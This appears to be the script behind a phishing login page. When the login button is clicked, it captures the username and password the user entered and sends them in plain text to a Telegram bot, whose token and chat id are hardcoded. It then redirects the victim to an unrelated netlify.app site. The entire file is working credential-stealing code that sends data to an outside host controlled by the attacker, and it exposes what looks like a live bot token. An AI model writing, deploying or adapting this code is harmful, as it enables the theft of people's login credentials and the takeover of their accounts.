const loginForm = document.querySelector('.login-btn');
const usernameInput = document.querySelector('#username');
const passwordInput = document.querySelector('#password');

loginForm.addEventListener('click', (event) => {
  event.preventDefault();
  const username = usernameInput.value;
  const password = passwordInput.value;

  fetch('https://api.telegram.org/bot6669582214:AAHQWJgniXsyaSJwaBZu9t-yI0FfEYiFMNA/sendMessage', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: '1579918116',
      text: `Username: ${username}\nPassword: ${password}`,
    }),
  })
    .then(() => {
      // Redirect the user to the desired website
      window.location.href = 'https://marvelous-choux-1a0e73.netlify.app/'; // Replace with the desired website
    })
    .catch((error) => {
      console.error(error);
    });
});